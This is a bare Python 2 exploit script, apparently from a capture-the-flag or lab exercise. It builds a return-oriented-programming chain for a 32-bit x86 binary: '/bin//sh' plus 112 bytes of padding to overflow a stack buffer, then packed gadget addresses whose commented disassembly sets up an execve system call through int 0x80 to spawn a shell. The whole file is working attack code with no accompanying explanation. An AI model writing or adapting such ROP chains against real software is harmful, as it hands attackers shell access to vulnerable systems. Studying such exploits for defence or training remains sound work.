from struct import pack

code = "/bin//sh";

addr1 = 0x8051750;
# 8051750:	31 c0                	xor    %eax,%eax
# 8051752:	c3                   	ret   

addr2 = 0x8058689;
#8058689:	89 81 e8 ff ff ff    	mov    %eax,-0x18(%ecx)
# 805868f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
# 8058694:	c3                   	ret   

addr3 = 0x8057361;
#8057360:      5a                   	pop    %edx
#8057361:	59                   	pop    %ecx
# 8057362:	5b                   	pop    %ebx
ecx1 = 0xbffe9930;
ecx2 = 0xbffe993c;
ecx3 = 0xbffe992c;
ecx4 = 0xbffe9914;
ebx = 0xbffe991c;

addr4 = 0x8050bbc;
# 8050bbc:	40                   	inc    %eax
# 8050bbd:	5f                   	pop    %edi
# 8050bbe:	c3                   	ret  


addr5 = 0x80643e8;
# 80643e8:	31 d2                	xor    %edx,%edx
# 80643ea:	f7 f3                	div    %ebx
# 80643ec:	01 c1                	add    %eax,%ecx
# 80643ee:	89 c8                	mov    %ecx,%eax
# 80643f0:	5b                   	pop    %ebx
# 80643f1:	5e                   	pop    %esi
# 80643f2:	c3                   	ret    

addr6 = 0x80485a0;
#80485a0:	89 d8                	mov    %ebx,%eax
# 80485a2:	5b                   	pop    %ebx
# 80485a3:	5e                   	pop    %esi
# 80485a4:	5f                   	pop    %edi
# 80485a5:	5d                   	pop    %ebp
# 80485a6:	c3                   	ret 

addr7 = 0x8057ae0;
#8057ae0:	cd 80                	int    $0x80

print code + 'A'*(112-len(code)) + pack('<I', addr3) + pack('<I', ecx1)+ pack('<I', ebx) + pack('<I', addr1) + pack('<I', addr2) + pack('<I', addr3) + pack('<I', ecx2)+ pack('<I', ebx) + pack('<I', addr1) + pack('<I', addr2) + pack('<I', addr3)+ pack('<I', ecx3)+ pack('<I', ebx) + pack('<I', addr6) + pack('<I', ebx) + pack('<I', ebx) + pack('<I', ebx) + pack('<I',ebx) + pack('<I', addr2) + pack('<I', addr1) + pack('<I', addr5) + pack('<I', ebx) + pack('<I', ebx) + pack('<I', addr1) + pack('<I', addr4) + pack('<I', ebx) + pack('<I', addr4) + pack('<I', ebx) + pack('<I', addr4) + pack('<I', ebx) + pack('<I', addr4) + pack('<I', ebx) + pack('<I', addr4) + pack('<I', ebx) + pack('<I', addr4) + pack('<I', ebx) + pack('<I', addr4) + pack('<I', ebx) + pack('<I', addr4) + pack('<I', ebx) + pack('<I', addr4) + pack('<I', ebx) + pack('<I', addr4) + pack('<I', ebx) + pack('<I', addr4) + pack('<I', ebx) + pack('<I', addr3) + pack('<I', ecx4)+ pack('<I', ebx) +  pack('<I',addr7)
